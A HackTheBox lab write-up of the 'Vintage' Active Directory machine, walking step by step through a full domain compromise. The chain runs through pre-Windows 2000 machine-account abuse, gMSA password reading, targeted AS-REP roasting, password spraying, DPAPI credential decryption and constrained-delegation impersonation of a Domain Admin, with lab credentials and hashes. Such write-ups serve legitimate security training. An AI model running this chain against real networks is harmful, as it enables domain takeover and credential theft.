---
title: "HTB - Vintage (Medium | Windows | Active Directory)"
date: 2026-10-02 12:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, netexec, nxc, evil-winrm, bloodhound, kerberos, pre-windows-2000, readgmsapassword, kinit, bloodyad, genericwrite, addself, gettgt, targeted-kerberoasting, john, password-spray, dpapi, as-rep-roasting, kerbrute, pre2k, wmiexec]
description: "Pre-Windows 2000 computer account abuse (pre2k) for initial access, ReadGMSAPassword and targeted Kerberoasting via GenericWrite to pivot, DPAPI credential extraction, then constrained delegation (S4U2Proxy) to Domain Admin"
image:
  path: /assets/img/vintage.png
---


## Recon

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-06 11:35:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
57762/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-06T11:36:12
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

### Service Discovery Analysis

The Nmap scan reveals a full Active Directory Domain Controller:

- **DNS (Port 53)**: Simple DNS Plus — confirms this is the domain's DNS server
- **Kerberos (Port 88)**: Confirms Active Directory environment
- **LDAP (Port 389, 636, 3268, 3269)**: Active Directory LDAP services
- **SMB (Port 139, 445)**: Microsoft Windows file sharing — message signing enabled and required (SMB relay attacks ruled out)
- **kpasswd (Port 464)**: Kerberos password change service
- **WinRM (Port 5985)**: Remote management — viable shell access if credentials are obtained
- **.NET Message Framing (Port 9389)**: AD Web Services
- **RPC (Multiple ports)**: Various Windows RPC endpoints

OS: Windows Domain: vintage.htb Hostname: DC01

No HTTP, FTP, or SQL services are exposed — unlike web-facing AD boxes, the attack surface here is limited entirely to AD protocols (SMB, LDAP, Kerberos). This points toward classic AD enumeration techniques: null/anonymous SMB sessions, LDAP anonymous binds, username enumeration via Kerberos, or AS-REP/Kerberoasting once valid accounts are found.

We add the domain to /etc/hosts:

```bash
echo "<target> vintage.htb DC01.vintage.htb" | sudo tee -a /etc/hosts
```

---

## User

|Username|Password|
|---|---|
|P.Rosa|Rosaisbest123|

First thing I try is verifying the credentials over SMB:

```bash
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123

SMB  <target>  445  <target>  [-] <target>\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

It fails. Looking at the output, `(NTLM:False)` tells me why — NTLM authentication is disabled on this domain. That's an important constraint that'll affect every tool I use. I need to switch everything to Kerberos. With `-k` it works:

```bash
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k

SMB  dc01.vintage.htb  445  dc01  [+] vintage.htb\P.Rosa:Rosaisbest123
```

Worth noting: Kerberos is sensitive to the hostname used. Using just `dc01` or `vintage.htb` fails because they don't resolve to the correct realm. I need the full FQDN `dc01.vintage.htb` throughout.

```bash
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --shares
```

![](/assets/img/vintage/Pasted_image_20261007012022.png)

Ensure Kerberos configuration file (/etc/krb5.conf) is set up correctly:

```bash
# 1 create the krb5 file
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --generate-krb5-file vintage.krb5

# 2 paste the vintage.krb5 in /etc/krb5.conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VINTAGE.HTB

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
        default_domain = vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB 
```

Only default DC shares, nothing interesting. Moving on. Since NTLM is disabled, I need a TGT first to use Kerberos auth with ldapsearch and other tools:

```bash
kinit P.Rosa@VINTAGE.HTB
```

![](/assets/img/vintage/Pasted_image_20261007012534.png)

Confirming LDAP access and looking for privileged accounts:

```bash
nxc ldap 'dc01.vintage.htb' -k -u 'P.Rosa' -p 'Rosaisbest123' --admin-count
```

![](/assets/img/vintage/Pasted_image_20261007012615.png)

`L.Bianchi_adm` has `adminCount=1` — that's a protected admin account and likely the end goal. I'll also dump the full user list for later:

```bash
nxc smb 'dc01.vintage.htb' -k -u 'P.Rosa' -p 'Rosaisbest123' --rid-brute 10000 | grep 'SidTypeUser' | awk '{print $6}' | cut -d'\' -f2 > users.txt
```

### BloodHound Enumeration

With the domain enumerated, I'll collect BloodHound data to map the full attack surface:

```bash
bloodhound-python -u 'P.Rosa' -p 'Rosaisbest123' -d 'vintage.htb' -ns <target> --zip -c All -dc 'dc01.vintage.htb'
```

This was the result:

![](/assets/img/vintage/Pasted_image_20261007013324.png) `FS01$` is a member of the **Pre-Windows 2000 Compatible Access** group — its password is predictable

![](/assets/img/vintage/Pasted_image_20261007013351.png) `FS01$` has **ReadGMSAPassword** over `GMSA01$`

![](/assets/img/vintage/Pasted_image_20261007013429.png) `GMSA01$` has **AddSelf** and **GenericWrite** over `SERVICEMANAGERS`

![](/assets/img/vintage/Pasted_image_20261007013511.png) `SERVICEMANAGERS` has **GenericWrite** over multiple service accounts

### Pre-Windows 2000 Compatible Access Abuse

Computer accounts created with the "Pre-Windows 2000 Compatible Access" setting have a known default: their password is set to the lowercase hostname. `FS01$` is a member of that group, so its password should be `fs01`. I'll use `pre2k` to confirm and get a Kerberos ticket:

```bash
# 1 Installation of pre2k
git clone https://github.com/garrettfoster13/pre2k.git && cd pre2k
pipx install .

# 2 Execute the command
pre2k unauth -d vintage.htb -dc-ip <target> -save -inputfile users.txt
```

![](/assets/img/vintage/Pasted_image_20261007014128.png)

It works. I now have a valid Kerberos ticket for the `FS01$` machine account:

```bash
export KRB5CCNAME=FS01\$.ccache
```

### GMSA Password Extraction (ReadGMSAPassword)

Now we are reading the GMSA password. BloodHound showed `FS01$` has `ReadGMSAPassword` over `GMSA01$`. Group Managed Service Accounts store their password in the `msDS-ManagedPassword` attribute — readable by accounts granted that right. I'll use `bloodyAD` with the `FS01$` ticket to extract it:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip <target> -k get object 'GMSA01$' --attr msDS-ManagedPassword
```

![](/assets/img/vintage/Pasted_image_20261007014443.png)

I have the NT hash for `GMSA01$`. Since NTLM auth is disabled, I can't use pass-the-hash directly — I need to convert this into a Kerberos ticket:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-getTGT vintage.htb/'GMSA01$' -hashes :973801840f93d518a987b87cf8faa5d8
```

![](/assets/img/vintage/Pasted_image_20261007014725.png)

```bash
export KRB5CCNAME=GMSA01\$.ccache
```

### Targeted Kerberoast via GenericWrite

Adding GMSA01$ to SERVICEMANAGERS. `GMSA01$` has `AddSelf` over `SERVICEMANAGERS`, meaning it can add itself to the group. That group then has `GenericWrite` over the service accounts I need to target:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip <target> -k add groupMember "SERVICEMANAGERS" "GMSA01$"

[+] GMSA01$ added to SERVICEMANAGERS
```

![](/assets/img/vintage/Pasted_image_20261007014853.png)

Now that `GMSA01$` is in `SERVICEMANAGERS`, which has `GenericWrite` over the service accounts, I can perform a **Targeted Kerberoast**. The technique: use `GenericWrite` to set a `msDS-AllowedToDelegateTo` or — more directly — disable Kerberos pre-authentication on the target account (`DONT_REQ_PREAUTH`), then request an AS-REP hash to crack offline.

> **Note:** This is technically a Targeted Kerberoast via GenericWrite, not standard AS-REP Roasting. The difference matters: I'm _forcing_ the condition on an account I have write access to, rather than finding accounts that were already misconfigured.

The service accounts are disabled by default. I need to re-enable them before I can interact with them:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip <target> -k remove uac svc_sql -f ACCOUNTDISABLE

[+] ['ACCOUNTDISABLE'] property flags removed from svc_sql userAccountControl

faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip <target> -k remove uac svc_ark -f ACCOUNTDISABLE

[+] ['ACCOUNTDISABLE'] property flags removed from svc_arks userAccountControl

faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip <target> -k remove uac svc_ldap -f ACCOUNTDISABLE

[+] ['ACCOUNTDISABLE'] property flags removed from svc_ldaps userAccountControl
```

With `GenericWrite`, I can set `DONT_REQ_PREAUTH` on the service accounts, making them roastable:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip <target> -k add uac svc_sql -f DONT_REQ_PREAUTH

[+] ['DONT_REQ_PREAUTH'] property flags added to svc_sql userAccountControl

faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip <target> -k add uac svc_ldap -f DONT_REQ_PREAUTH

[+] ['DONT_REQ_PREAUTH'] property flags added to svc_ldap userAccountControl

faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip <target> -k add uac svc_ark -f DONT_REQ_PREAUTH

[+] ['DONT_REQ_PREAUTH'] property flags added to svc_ark userAccountControl
```

> This only works on service accounts — attempting it on regular user accounts returns insufficient permissions.

Now request and crack the hash:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
GetNPUsers.py vintage.htb/ -request -usersfile users.txt -format hashcat
```

![](/assets/img/vintage/Pasted_image_20261007020831.png)

```bash
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![](/assets/img/vintage/Pasted_image_20261007020948.png)

`svc_sql:Zer0the0ne`

Password Spray

Service accounts often share passwords with regular users in poorly managed domains. I'll spray `Zer0the0ne` across all domain users:

```bash
./kerbrute_linux_amd64 passwordspray -d vintage.htb --dc <target> users.txt Zer0the0ne
```

![](/assets/img/vintage/Pasted_image_20261007021141.png)

### Shell as C.Neri

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-getTGT vintage.htb/'C.Neri':'Zer0the0ne'

export KRB5CCNAME=C.Neri.ccache

evil-winrm -i dc01.vintage.htb -r vintage.htb
```

![](/assets/img/vintage/Pasted_image_20261007021317.png)

We capture the user.txt.

---

## Root

### DPAPI Credential Extraction

Once on the box as `C.Neri`, I check the usual places for stored credentials. Windows Credential Manager stores credentials in `AppData\Roaming\Microsoft\Credentials`, encrypted with DPAPI master keys stored in `AppData\Roaming\Microsoft\Protect`:

![](/assets/img/vintage/Pasted_image_20261007021718.png)

```powershell
Get-ChildItem "C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials" -Force | Format-List

Get-ChildItem "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect" -Force | Format-List
```

![](/assets/img/vintage/Pasted_image_20261007021813.png)

![](/assets/img/vintage/Pasted_image_20261007022517.png)

These are hidden and protected system files, which are not meant to be directly accessed or modified by users. To retrieve these blobs, we can also use the attrib command to list all files, including hidden and system files:

```powershell
attrib -s -h *.* /s
```

Two master key files found. I'll download everything with evil-winrm's `download` command and decrypt offline using `C.Neri`'s password — since I know it, I can derive the master key without needing the domain backup key:

```shell
impacket-dpapi masterkey -file "4dbf04d8-529b-4b4c-b4ae-8e875e4fe847" -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
```

![](/assets/img/vintage/Pasted_image_20261007022654.png)

```bash
impacket-dpapi masterkey -file "99cf41a3-a552-4cf7-a8d7-aca2d6f7339b" -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
```

![](/assets/img/vintage/Pasted_image_20261007022832.png)

With the master keys decrypted, I can now decrypt the credential blob:

```shell
impacket-dpapi credential -file "C4BB96844A5C9DD45D5B6A9859252BA6" -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

![](/assets/img/vintage/Pasted_image_20261007023159.png)

Credentials recovered: `C.Neri_adm : Uncr4ck4bl3P4ssW0rd0312`. This is `C.Neri`'s admin account — a common pattern in AD environments where admins have both a regular and a `_adm` account.

Now that I have admin credentials, I'll re-run BloodHound to see what new paths open up:

```bash
bloodhound-python -u 'C.Neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -d 'vintage.htb' -ns <target> --zip -c All -dc 'dc01.vintage.htb'
```

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-getTGT vintage.htb/'c.neri_adm':'Uncr4ck4bl3P4ssW0rd0312'
export KRB5CCNAME=c.neri_adm.ccache
```

![](/assets/img/vintage/Pasted_image_20261007024157.png)

![](/assets/img/vintage/Pasted_image_20261007024325.png)

### Constrained Delegation Abuse (S4U2Proxy)

BloodHound reveals: `C.Neri_adm` can add members to `DELEGATEDADMINS`, and accounts in that group have constrained delegation configured toward the DC.

We identified a high-value account on the machine — `L.Bianchi_adm`, a member of the Domain Admins group. However, the current `C.Neri_adm` account cannot directly perform a Kerberos Delegation attack.

First we can leverage the GenericWrite privilege of `C.Neri` on the service account `svc_sql`, by adding an SPN via the `C.Neri` shell:

```bash
Set-ADUser -Identity svc_sql -Add @{servicePrincipalName="cifs/whateverhostitis"}
```

And we can verify the result:

```bash
Get-ADUser -Identity svc_sql -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
```

![](/assets/img/vintage/Pasted_image_20261007025853.png)

Then try to add the compromised service account `svc_sql` to the DelegatedAdmins group, via the privilege of `C.Neri_adm` with her TGT:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host dc01.vintage.htb --dc-ip <target> -d "VINTAGE.HTB" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "DELEGATEDADMINS" "SVC_SQL"
```

![](/assets/img/vintage/Pasted_image_20261007024440.png)

Re-enable SVC_SQL and assign SPN. `SVC_SQL` is still disabled from earlier. Re-enable it and set an SPN — delegation only works on accounts that have one:

```bash
bloodyAD --host dc01.vintage.htb --dc-ip <target> -d "VINTAGE.HTB" -k remove uac svc_sql -f ACCOUNTDISABLE
```

![](/assets/img/vintage/Pasted_image_20261007030229.png)

Get SVC_SQL TGT:

```bash
getTGT.py vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
export KRB5CCNAME=svc_sql.ccache
```

Impersonate L.Bianchi_adm via S4U2Proxy. With `SVC_SQL` in `DELEGATEDADMINS` and constrained delegation configured for `cifs/dc01.vintage.htb`, I can use S4U2Self + S4U2Proxy to request a service ticket impersonating the Domain Admin:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip <target> -k 'vintage.htb/svc_sql:Zer0the0ne'
```

![](/assets/img/vintage/Pasted_image_20261007030411.png)

```bash
export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

Shell as Domain Admin:

```bash
wmiexec.py -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb
```

![](/assets/img/vintage/Pasted_image_20261007030540.png)

We capture the root.txt.

---

### Summary

**Attack Chain:**

1. **SMB/Kerberos Validation** → NTLM disabled domain-wide; switched to Kerberos auth (`-k`) with provided credentials (P.Rosa)
2. **Kerberos Config** → Generated and installed `/etc/krb5.conf` for the VINTAGE.HTB realm
3. **LDAP Enumeration** → Identified `L.Bianchi_adm` as a protected admin account via `--admin-count`
4. **User Enumeration** → RID-brute via SMB to build a full `users.txt`
5. **BloodHound Collection** → Mapped attack paths: FS01$ (Pre-Win2k group) → GMSA01$ (ReadGMSAPassword) → SERVICEMANAGERS (AddSelf/GenericWrite) → service accounts
6. **Pre-Windows 2000 Abuse** → Predicted `FS01$` password (lowercase hostname), confirmed with `pre2k`, obtained a Kerberos ticket
7. **GMSA Password Extraction** → Used `FS01$` ticket + `bloodyAD` to read `GMSA01$`'s `msDS-ManagedPassword`, converted the NT hash to a TGT
8. **Group Self-Addition** → `GMSA01$` added itself to `SERVICEMANAGERS` via `AddSelf`
9. **Targeted Kerberoast** → Used inherited `GenericWrite` to re-enable disabled service accounts and set `DONT_REQ_PREAUTH`, then AS-REP roasted and cracked `svc_sql`'s hash with John
10. **Password Spray** → Reused `svc_sql`'s cracked password across all domain users with kerbrute, landing on `C.Neri`
11. **User Shell** → Obtained TGT for C.Neri, connected via evil-winrm over Kerberos, captured user.txt
12. **DPAPI Credential Extraction** → Located cached credential blobs and master keys in C.Neri's profile, decrypted them offline with impacket-dpapi using her known password
13. **Admin Account Recovery** → Decrypted blob revealed `C.Neri_adm`'s password
14. **Constrained Delegation Abuse** → Re-ran BloodHound as `C.Neri_adm`, found rights to add members to `DELEGATEDADMINS` (constrained delegation to the DC)
15. **SPN Injection** → Used `C.Neri`'s GenericWrite over `svc_sql` to add an SPN, making it delegation-eligible
16. **Group Addition for Delegation** → Added `svc_sql` to `DELEGATEDADMINS` using `C.Neri_adm`'s rights
17. **S4U2Self/S4U2Proxy Abuse** → Requested a service ticket impersonating `L.Bianchi_adm` (Domain Admin) through `svc_sql`'s delegation rights
18. **Domain Admin Shell** → Used the impersonated ticket with `wmiexec.py` for a Domain Admin shell, captured root.txt
